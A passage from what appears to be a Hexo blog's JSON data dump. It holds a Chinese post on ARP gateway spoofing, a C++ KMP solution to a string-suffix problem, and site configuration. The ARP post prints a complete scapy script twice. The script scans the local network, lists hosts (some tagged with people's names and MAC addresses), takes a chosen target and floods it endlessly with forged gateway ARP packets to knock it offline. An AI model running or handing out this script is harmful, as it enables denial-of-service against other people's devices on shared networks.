title=\"原理\"></a>原理</h1><p>攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><p>inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。<br>host为一个备注字典表，键，值分别对应MAC地址和备注。<br><a id=\"more\"></a></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> scapy.all <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">inet = [</span><br><span class=\"line\">    [<span class=\"string\">&quot;Intel(R) Dual Band Wireless-AC 3165&quot;</span>, <span class=\"string\">&quot;7C:67:A2:F1:9D:2A&quot;</span>],</span><br><span class=\"line\">    [<span class=\"string\">&quot;802.11n USB Wireless LAN Card&quot;</span>, <span class=\"string\">&quot;70:F1:1C:04:8A:54&quot;</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\">host = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;60:14:b3:ad:85:7d&quot;</span>: <span class=\"string\">&quot;LiuQI&#x27;s PC-eth&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;50:a0:09:d1:fb:65&quot;</span>: <span class=\"string\">&quot;MiAi Sound Box&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;04:4f:4c:8e:dc:b8&quot;</span>: <span class=\"string\">&quot;LiuQi&#x27;s Honor 9&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;f4:30:b9:a6:0f:76&quot;</span>: <span class=\"string\">&quot;Unkown&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;54:e1:ad:7c:0b:53&quot;</span>: <span class=\"string\">&quot;ZhiHao&#x27;s PC-eth&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">net = <span class=\"number\">0</span></span><br><span class=\"line\">wifi = inet[net][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> os.popen(<span class=\"string\">&#x27;route print&#x27;</span>):</span><br><span class=\"line\">    s = line.strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s.startswith(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>):</span><br><span class=\"line\">        slist = s.split()</span><br><span class=\"line\">        ip = slist[<span class=\"number\">3</span>]</span><br><span class=\"line\">        gw = slist[<span class=\"number\">2</span>]</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(<span class=\"string\">&#x27;GW：&#x27;</span>, gw)</span><br><span class=\"line\">print(<span class=\"string\">&#x27;IP：&#x27;</span>, ip)</span><br><span class=\"line\">tnet = gw + <span class=\"string\">&#x27;/24&#x27;</span></span><br><span class=\"line\">p = Ether(dst=<span class=\"string\">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(pdst=tnet)</span><br><span class=\"line\">ans, unans = srp(p, iface=wifi, timeout=<span class=\"number\">5</span>, verbose=<span class=\"number\">0</span>)</span><br><span class=\"line\">print(<span class=\"string\">&quot;Total %d Host：&quot;</span> % len(ans))</span><br><span class=\"line\">result = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> s, r <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">    result.append([r[ARP].psrc, r[ARP].hwsrc])</span><br><span class=\"line\">result.sort()</span><br><span class=\"line\"><span class=\"keyword\">for</span> index, (ip, mac) <span class=\"keyword\">in</span> enumerate(result):</span><br><span class=\"line\">    print(index + <span class=\"number\">1</span>, <span class=\"string\">&quot;: &quot;</span>, ip, <span class=\"string\">&quot;\\t----&gt;\\t&quot;</span>, mac, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> host.get(mac) == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&quot; ......&quot;</span>, host[mac])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        print()</span><br><span class=\"line\">target = int(input(<span class=\"string\">&quot;Target：&quot;</span>)) - <span class=\"number\">1</span></span><br><span class=\"line\">target = result[target][<span class=\"number\">0</span>]</span><br><span class=\"line\">p1 = Ether(dst=<span class=\"string\">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>, src=inet[net][<span class=\"number\">1</span>]) / ARP(pdst=target, psrc=gw)</span><br><span class=\"line\">print(<span class=\"string\">&quot;Processing......&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    sendp(p1, verbose=<span class=\"number\">0</span>)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1604,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><p>inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。<br>host为一个备注字典表，键，值分别对应MAC地址和备注。<br>","more":"</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> scapy.all <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">inet = [</span><br><span class=\"line\">    [<span class=\"string\">&quot;Intel(R) Dual Band Wireless-AC 3165&quot;</span>, <span class=\"string\">&quot;7C:67:A2:F1:9D:2A&quot;</span>],</span><br><span class=\"line\">    [<span class=\"string\">&quot;802.11n USB Wireless LAN Card&quot;</span>, <span class=\"string\">&quot;70:F1:1C:04:8A:54&quot;</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\">host = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;60:14:b3:ad:85:7d&quot;</span>: <span class=\"string\">&quot;LiuQI&#x27;s PC-eth&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;50:a0:09:d1:fb:65&quot;</span>: <span class=\"string\">&quot;MiAi Sound Box&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;04:4f:4c:8e:dc:b8&quot;</span>: <span class=\"string\">&quot;LiuQi&#x27;s Honor 9&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;f4:30:b9:a6:0f:76&quot;</span>: <span class=\"string\">&quot;Unkown&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;54:e1:ad:7c:0b:53&quot;</span>: <span class=\"string\">&quot;ZhiHao&#x27;s PC-eth&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">net = <span class=\"number\">0</span></span><br><span class=\"line\">wifi = inet[net][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> os.popen(<span class=\"string\">&#x27;route print&#x27;</span>):</span><br><span class=\"line\">    s = line.strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s.startswith(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>):</span><br><span class=\"line\">        slist = s.split()</span><br><span class=\"line\">        ip = slist[<span class=\"number\">3</span>]</span><br><span class=\"line\">        gw = slist[<span class=\"number\">2</span>]</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(<span class=\"string\">&#x27;GW：&#x27;</span>, gw)</span><br><span class=\"line\">print(<span class=\"string\">&#x27;IP：&#x27;</span>, ip)</span><br><span class=\"line\">tnet = gw + <span class=\"string\">&#x27;/24&#x27;</span></span><br><span class=\"line\">p = Ether(dst=<span class=\"string\">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(pdst=tnet)</span><br><span class=\"line\">ans, unans = srp(p, iface=wifi, timeout=<span class=\"number\">5</span>, verbose=<span class=\"number\">0</span>)</span><br><span class=\"line\">print(<span class=\"string\">&quot;Total %d Host：&quot;</span> % len(ans))</span><br><span class=\"line\">result = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> s, r <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">    result.append([r[ARP].psrc, r[ARP].hwsrc])</span><br><span class=\"line\">result.sort()</span><br><span class=\"line\"><span class=\"keyword\">for</span> index, (ip, mac) <span class=\"keyword\">in</span> enumerate(result):</span><br><span class=\"line\">    print(index + <span class=\"number\">1</span>, <span class=\"string\">&quot;: &quot;</span>, ip, <span class=\"string\">&quot;\\t----&gt;\\t&quot;</span>, mac, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> host.get(mac) == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&quot; ......&quot;</span>, host[mac])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        print()</span><br><span class=\"line\">target = int(input(<span class=\"string\">&quot;Target：&quot;</span>)) - <span class=\"number\">1</span></span><br><span class=\"line\">target = result[target][<span class=\"number\">0</span>]</span><br><span class=\"line\">p1 = Ether(dst=<span class=\"string\">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>, src=inet[net][<span class=\"number\">1</span>]) / ARP(pdst=target, psrc=gw)</span><br><span class=\"line\">print(<span class=\"string\">&quot;Processing......&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    sendp(p1, verbose=<span class=\"number\">0</span>)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>"},{"title":"A Secret","date":"2019-03-29T09:11:09.000Z","abbrlink":"a56468f6","_content":"# Description\n{% blockquote %}\nToday is the birthday of SF,so VS gives two strings S1,S2 to SF as a present,which have a big secret.SF is interested in this secret and ask VS how to get it.There are the things that VS tell:\n  Suffix(S2,i) = S2[i...len].Ni is the times that Suffix(S2,i) occurs in S1 and Li is the length of Suffix(S2,i).Then the secret is the sum of the product of Ni and Li.\n  Now SF wants you to help him find the secret.The answer may be very large, so the answer should mod 1000000007.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nInput contains multiple cases.\n  The first line contains an integer T,the number of cases.Then following T cases.\n  Each test case contains two lines.The first line contains a string S1.The second line contains a string S2.\n  1<=T<=10.1<=|S1|,|S2|<=1e6.S1 and S2 only consist of lowercase ,uppercase letter.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor each test case,output a single line containing a integer,the answer of test case.\n  The answer may be very large, so the answer should mod 1e9+7.\n{% endblockquote %}\n# Sample Input\n```nohilight\n2\naaaaa\naa\nabababab\naba\n```\n# Sample Output\n```nohilight\n13\n19\n```\n# Hint\n```nohilight\ncase 2: \nSuffix(S2,1) = \"aba\",\nSuffix(S2,2) = \"ba\",\nSuffix(S2,3) = \"a\".\nN1 = 3,\nN2 = 3,\nN3 = 4.\nL1 = 3,\nL2 = 2,\nL3 = 1.\nans = （3*3+3*2+4*1）%1000000007.\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\n#include<algorithm>\n#define mod 1000000007\nusing namespace std;\nstring a,b;\nint NEXT[1000020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j])\n        {\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0;\n    long long ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            ans+=j+1;\n            ans%=mod;\n            i++;j++;\n        }\n        else\n        {\n            if(j==0)i++;\n            else\n            {\n                j=NEXT[j];\n                ans+=1ll*j*(j+1)/2;\n                ans%=mod;\n            }\n        }\n    }\n    return ans;\n}\nint main()\n{\n    ios::sync_with_stdio(false);\n    int T;\n    cin>>T;\n    while(T--)\n    {\n        cin>>a>>b;\n        reverse(a.begin(),a.end());\n        reverse(b.begin(),b.end());\n        a+='X';b+='Y';\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","source":"_posts/ASecret.md","raw":"---\ntitle: A Secret\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - KMP\nabbrlink: a56468f6\n---\n# Description\n{% blockquote %}\nToday is the birthday of SF,so VS gives two strings S1,S2 to SF as a present,which have a big secret.SF is interested in this secret and ask VS how to get it.There are the things that VS tell:\n  Suffix(S2,i) = S2[i...len].Ni is the times that Suffix(S2,i) occurs in S1 and Li is the length of Suffix(S2,i).Then the secret is the sum of the product of Ni and Li.\n  Now SF wants you to help him find the secret.The answer may be very large, so the answer should mod 1000000007.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nInput contains multiple cases.\n  The first line contains an integer T,the number of cases.Then following T cases.\n  Each test case contains two lines.The first line contains a string S1.The second line contains a string S2.\n  1<=T<=10.1<=|S1|,|S2|<=1e6.S1 and S2 only consist of lowercase ,uppercase letter.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor each test case,output a single line containing a integer,the answer of test case.\n  The answer may be very large, so the answer should mod 1e9+7.\n{% endblockquote %}\n# Sample Input\n```nohilight\n2\naaaaa\naa\nabababab\naba\n```\n# Sample Output\n```nohilight\n13\n19\n```\n# Hint\n```nohilight\ncase 2: \nSuffix(S2,1) = \"aba\",\nSuffix(S2,2) = \"ba\",\nSuffix(S2,3) = \"a\".\nN1 = 3,\nN2 = 3,\nN3 = 4.\nL1 = 3,\nL2 = 2,\nL3 = 1.\nans = （3*3+3*2+4*1）%1000000007.\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\n#include<algorithm>\n#define mod 1000000007\nusing namespace std;\nstring a,b;\nint NEXT[1000020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j])\n        {\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0;\n    long long ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            ans+=j+1;\n            ans%=mod;\n            i++;j++;\n        }\n        else\n        {\n            if(j==0)i++;\n            else\n            {\n                j=NEXT[j];\n                ans+=1ll*j*(j+1)/2;\n                ans%=mod;\n            }\n        }\n    }\n    return ans;\n}\nint main()\n{\n    ios::sync_with_stdio(false);\n    int T;\n    cin>>T;\n    while(T--)\n    {\n        cin>>a>>b;\n        reverse(a.begin(),a.end());\n        reverse(b.begin(),b.end());\n        a+='X';b+='Y';\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","slug":"ASecret","published":1,"updated":"2020-05-11T09:46:30.913Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexka40003qse531wl0rvd","content":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>Today is the birthday of SF,so VS gives two strings S1,S2 to SF as a present,which have a big secret.SF is interested in this secret and ask VS how to get it.There are the things that VS tell:<br>  Suffix(S2,i) = S2[i…len].Ni is the times that Suffix(S2,i) occurs in S1 and Li is the length of Suffix(S2,i).Then the secret is the sum of the product of Ni and Li.<br>  Now SF wants you to help him find the secret.The answer may be very large, so the answer should mod 1000000007.</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>Input contains multiple cases.<br>  The first line contains an integer T,the number of cases.Then following T cases.<br>  Each test case contains two lines.The first line contains a string S1.The second line contains a string S2.<br>  1&lt;=T&lt;=10.1&lt;=|S1|,|S2|&lt;=1e6.S1 and S2 only consist of lowercase ,uppercase letter.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For each test case,output a single line containing a integer,the answer of test case.<br>  The answer may be very large, so the answer should mod 1e9+7.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">aaaaa</span><br><span class=\"line\">aa</span><br><span class=\"line\">abababab</span><br><span class=\"line\">aba</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">13</span><br><span class=\"line\">19</span><br></pre></td></tr></table></figure>\n<h1 id=\"Hint\"><a href=\"#Hint\" class=\"headerlink\" title=\"Hint\"></a>Hint</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case 2: </span><br><span class=\"line\">Suffix(S2,1) &#x3D; &quot;aba&quot;,</span><br><span class=\"line\">Suffix(S2,2) &#x3D; &quot;ba&quot;,</span><br><span class=\"line\">Suffix(S2,3) &#x3D; &quot;a&quot;.</span><br><span class=\"line\">N1 &#x3D; 3,</span><br><span class=\"line\">N2 &#x3D; 3,</span><br><span class=\"line\">N3 &#x3D; 4.</span><br><span class=\"line\">L1 &#x3D; 3,</span><br><span class=\"line\">L2 &#x3D; 2,</span><br><span class=\"line\">L3 &#x3D; 1.</span><br><span class=\"line\">ans &#x3D; （3*3+3*2+4*1）%1000000007.</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 